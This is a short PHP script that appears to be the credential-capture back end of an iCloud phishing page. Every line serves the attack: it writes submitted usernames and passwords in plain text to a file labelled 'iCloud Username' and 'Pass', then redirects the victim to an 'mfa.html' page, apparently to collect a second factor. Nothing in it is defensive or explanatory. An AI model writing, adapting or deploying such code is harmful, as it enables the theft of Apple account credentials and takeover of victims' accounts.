<?php

file_put_contents("usernames-icloud.txt", "iCloud Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);

header('Location: mfa.html');

// Ensures that no further code is executed
exit();
?>